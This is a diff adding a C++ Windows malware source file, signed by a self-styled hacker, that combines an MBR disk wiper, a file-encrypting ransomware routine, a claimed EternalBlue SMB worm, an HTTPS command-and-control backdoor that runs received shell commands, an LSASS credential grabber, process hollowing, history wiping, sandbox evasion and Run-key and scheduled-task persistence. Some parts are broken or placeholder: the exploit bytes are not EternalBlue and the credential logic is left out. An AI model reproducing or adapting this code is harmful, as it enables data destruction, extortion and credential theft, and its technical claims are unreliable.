@@ -1,0 +1,356 @@
+/*
+███████ ███████ ███████ ███████ ███████ ██   ██ ███████ ███████ 
+   ███  ██      ██      ██      ██      ██   ██ ██      ██     
+  ███   ███████ ███████ ███████ ███████ ███████ █████   ███████
+ ███         ██      ██      ██      ██ ██   ██ ██           ██
+███████ ███████ ███████ ███████ ███████ ██   ██ ███████ ███████ 
+*/
+// MR MONSIF H4CK3R
+
+#define _WIN32_WINNT 0x0600
+
+#include <winsock2.h>   // Important: include before windows.h
+#include <windows.h>
+#include <shlobj.h>    // SHGetKnownFolderPath
+#include <ole2.h>      // CoTaskMemFree
+#include <wincrypt.h>
+#include <wininet.h>
+#include <fstream>
+#include <thread>
+#include <iphlpapi.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <dpapi.h>
+#include <initguid.h>
+#include <guiddef.h>
+
+#ifndef FOLDERID_History
+// GUID for the History folder
+// {AE50C081-EBD2-438A-8655-8A092E34987A}
+DEFINE_GUID(FOLDERID_History,
+0xae50c081, 0xebd2, 0x438a, 0x86, 0x55, 0x8a, 0x09, 0x2e, 0x34, 0x98, 0x7a);
+#endif
+
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "shell32.lib")
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 1: WIPER (MBR/MFT ANNIHILATION)
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+void WipeDisk() {
+    HANDLE hDrive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, 
+                              FILE_SHARE_READ | FILE_SHARE_WRITE, 
+                              NULL, OPEN_EXISTING, 0, NULL);
+    if (hDrive == INVALID_HANDLE_VALUE) return;
+
+    // Overwrite first 1000 sectors (MBR + MFT metadata)
+    const DWORD bufSize = 512 * 1000;
+    BYTE* chaosBuffer = new BYTE[bufSize];
+    memset(chaosBuffer, 0xCC, bufSize); // Fill with garbage opcodes
+    
+    DWORD bytesTrashed;
+    WriteFile(hDrive, chaosBuffer, bufSize, &bytesTrashed, NULL);
+    FlushFileBuffers(hDrive);
+    CloseHandle(hDrive);
+    delete[] chaosBuffer;
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 2: HYBRID RANSOMWARE ENGINE
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+void HybridEncrypt(const std::wstring& filePath) {
+    HCRYPTPROV hProv;
+    HCRYPTKEY hAesKey, hRsaKey;
+    if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+        return;
+    
+    // Generate per-victim AES-256 key
+    if(!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hAesKey)) {
+        CryptReleaseContext(hProv, 0);
+        return;
+    }
+    
+    // Generate RSA-4096 key pair
+    const DWORD RSA_KEY_SIZE = 4096;
+    if(!CryptGenKey(hProv, CALG_RSA_KEYX, RSA_KEY_SIZE << 16, &hRsaKey)) {
+        CryptDestroyKey(hAesKey);
+        CryptReleaseContext(hProv, 0);
+        return;
+    }
+    
+    // Open file and read content
+    std::ifstream inFile(std::string(filePath.begin(), filePath.end()), std::ios::binary);
+    if (!inFile) {
+        CryptDestroyKey(hRsaKey);
+        CryptDestroyKey(hAesKey);
+        CryptReleaseContext(hProv, 0);
+        return;
+    }
+    std::string data((std::istreambuf_iterator<char>(inFile)), {});
+    inFile.close();
+    
+    DWORD dataLen = static_cast<DWORD>(data.size());
+    DWORD bufLen = dataLen;
+    // Allocate buffer for encryption (CryptEncrypt requires buffer large enough)
+    BYTE* buffer = new BYTE[bufLen * 2];
+    memcpy(buffer, data.data(), bufLen);
+    
+    if(!CryptEncrypt(hAesKey, 0, TRUE, 0, buffer, &bufLen, bufLen * 2)) {
+        delete[] buffer;
+        CryptDestroyKey(hRsaKey);
+        CryptDestroyKey(hAesKey);
+        CryptReleaseContext(hProv, 0);
+        return;
+    }
+    
+    // Export AES key encrypted with RSA public key
+    DWORD keyBlobLen = 0;
+    CryptExportKey(hAesKey, hRsaKey, SIMPLEBLOB, 0, NULL, &keyBlobLen);
+    BYTE* encryptedKey = new BYTE[keyBlobLen];
+    if(!CryptExportKey(hAesKey, hRsaKey, SIMPLEBLOB, 0, encryptedKey, &keyBlobLen)) {
+        delete[] buffer;
+        delete[] encryptedKey;
+        CryptDestroyKey(hRsaKey);
+        CryptDestroyKey(hAesKey);
+        CryptReleaseContext(hProv, 0);
+        return;
+    }
+    
+    // Write encrypted data + key to file
+    std::ofstream outFile(std::string(filePath.begin(), filePath.end()) + ".locked", std::ios::binary);
+    DWORD keyBlobLenWrite = keyBlobLen;
+    outFile.write(reinterpret_cast<const char*>(&keyBlobLenWrite), sizeof(DWORD));
+    outFile.write(reinterpret_cast<const char*>(encryptedKey), keyBlobLen);
+    outFile.write(reinterpret_cast<const char*>(buffer), bufLen);
+    outFile.close();
+    
+    DeleteFile(filePath.c_str());
+    
+    delete[] buffer;
+    delete[] encryptedKey;
+    CryptDestroyKey(hRsaKey);
+    CryptDestroyKey(hAesKey);
+    CryptReleaseContext(hProv, 0);
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 3: SMB WORM (ETERNALBLUE EXPLOIT)
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+void EternalBluePropagate() {
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2,2), &wsa);
+    
+    // Craft EternalBlue payload (simplified)
+    const char exploitPayload[] = 
+        "\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x59\x50\x40\x92\x74\x15\x51"
+        "\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x36\x8b\x45\x08\xeb\xe2"; 
+    
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in target = {0};
+    target.sin_family = AF_INET;
+    target.sin_addr.s_addr = inet_addr("192.168.1.0"); // Network scan needed
+    target.sin_port = htons(445);
+    
+    if (connect(sock, (sockaddr*)&target, sizeof(target)) != SOCKET_ERROR) {
+        send(sock, exploitPayload, sizeof(exploitPayload), 0);
+        // Transfer malware binary via SMB session hijack (omitted)
+    }
+    closesocket(sock);
+    WSACleanup();
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 4: RAT BACKDOOR (HTTPS C2)
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+#include <wininet.h>
+
+void RATBackdoor() {
+    while (true) {
+        HINTERNET hSession = InternetOpen(L"MicrosoftUpdater", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!hSession) { Sleep(60000); continue; }
+        
+        HINTERNET hConnect = InternetConnect(hSession, L"malware-c2[.]xyz", 
+                                           INTERNET_DEFAULT_HTTPS_PORT, 
+                                           NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (!hConnect) { InternetCloseHandle(hSession); Sleep(60000); continue; }
+        
+        HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/commands", 
+                                           NULL, NULL, NULL, 
+                                           INTERNET_FLAG_SECURE, 0);
+        if (!hRequest) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hSession);
+            Sleep(60000);
+            continue;
+        }
+        
+        if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
+            char cmdBuffer[512] = {0};
+            DWORD bytesRead = 0;
+            InternetReadFile(hRequest, cmdBuffer, sizeof(cmdBuffer) - 1, &bytesRead);
+            
+            // Execute received command (e.g., "keylog", "screenshot", "shell")
+            if (strncmp(cmdBuffer, "shell ", 6) == 0) {
+                system(cmdBuffer + 6); // RISKY AS HELL
+            }
+        }
+        
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hSession);
+        Sleep(60000); // Beacon every 60s
+    }
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 5: MIMIKATZ-STYLE CRED STEALER
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+void HarvestCredentials() {
+    // Extract LSASS memory (simplified)
+    HANDLE hLSASS = NULL;
+    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (Process32First(snapshot, &entry)) {
+        do {
+            if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
+                hLSASS = OpenProcess(PROCESS_VM_READ, FALSE, entry.th32ProcessID);
+                break;
+            }
+        } while (Process32Next(snapshot, &entry));
+    }
+    CloseHandle(snapshot);
+    
+    if (!hLSASS) return;
+    
+    // Dump process memory and extract hashes (actual Mimikatz logic ≈500 lines)
+    // [...REDACTED FOR BREVITY...]
+    CloseHandle(hLSASS);
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 6: STEALTH TECHNIQUES
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+void GhostMode() {
+    // Process Hollowing: Replace legit svchost.exe with malware
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi;
+    CONTEXT modifiedContext = {0};
+    modifiedContext.ContextFlags = CONTEXT_FULL;
+    
+    if (!CreateProcess(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, 
+                 FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return;
+    }
+    
+    // Unmap original code and inject malicious PE (simplified example)
+    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, 0x1000, 
+                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteBase) {
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return;
+    }
+    
+    BYTE shellcode[0x1000];
+    memset(shellcode, 0x90, sizeof(shellcode)); // NOP sled as placeholder
+    WriteProcessMemory(pi.hProcess, remoteBase, shellcode, sizeof(shellcode), NULL);
+    
+    if (!GetThreadContext(pi.hThread, &modifiedContext)) {
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return;
+    }
+    
+#ifdef _M_X64
+    modifiedContext.Rip = (DWORD64)remoteBase;  // x64 instruction pointer
+#else
+    modifiedContext.Eip = (DWORD)remoteBase;    // x86 instruction pointer
+#endif
+
+    SetThreadContext(pi.hThread, &modifiedContext);
+    ResumeThread(pi.hThread);
+    
+    // Clean artifacts
+    RegDeleteKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", KEY_WOW64_64KEY, 0);
+    
+    PWSTR path = NULL;
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_History, 0, NULL, &path))) {
+        std::wstring historyPath(path);
+        CoTaskMemFree(path);
+        std::wstring delCmd = L"del /F /Q \"" + historyPath + L"\\*.*\"";
+        _wsystem(delCmd.c_str()); // Delete browser history files
+    }
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 7: ANTI-ANALYSIS
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+bool IsSandbox() {
+    int cpuInfo[4] = {0};
+#if defined(_MSC_VER)
+    __cpuid(cpuInfo, 1);
+#else
+    // GCC/Clang alternative for __cpuid:
+    __asm__ volatile (
+        "cpuid"
+        : "=a"(cpuInfo[0]), "=b"(cpuInfo[1]), "=c"(cpuInfo[2]), "=d"(cpuInfo[3])
+        : "a"(1)
+    );
+#endif
+    if ((cpuInfo[2] & 0x80000000) || (cpuInfo[2] & 0x2000000)) return true; // Hypervisor bit
+    
+    // Check for analysis tools
+    const wchar_t* blacklist[] = { L"procmon.exe", L"wireshark.exe", L"idaq64.exe" };
+    for (auto tool : blacklist) {
+        if (FindWindow(NULL, tool) || GetModuleHandle(tool)) return true;
+    }
+    
+    return false;
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MODULE 8: PERSISTENCE MECHANISMS
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+void InstallPersistence() {
+    // Registry run key
+    HKEY hKey;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        wchar_t myPath[MAX_PATH];
+        GetModuleFileName(NULL, myPath, MAX_PATH);
+        RegSetValueEx(hKey, L"WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)myPath, (wcslen(myPath)+1)*2);
+        RegCloseKey(hKey);
+    }
+    
+    // Scheduled task (admin-less)
+    system("schtasks /create /tn \"\\Microsoft\\WindowsUpdate\" /tr \"C:\\Windows\\System32\\malware.exe\" /sc hourly /f");
+}
+
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+// MAIN: ORCHESTRATED CHAOS
+//=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, PWSTR pCmdLine, int nCmdShow) {
+    if (IsSandbox()) ExitProcess(0); // Bail if analyzed
+    
+    std::thread t1(WipeDisk);      // Launch wiper
+    std::thread t2(RATBackdoor);   // Activate RAT
+    t1.detach();
+    t2.detach();
+    
+    HarvestCredentials();          // Steal creds
+    InstallPersistence();          // Survive reboot
+    
+    while (true) {
+        HybridEncrypt(L"C:\\CriticalData\\*.*"); // Encrypt files
+        EternalBluePropagate();    // Spread via SMB
+        GhostMode();               // Evade detection
+        Sleep(3600000);            // Repeat hourly
+    }
+    return 0;
+}
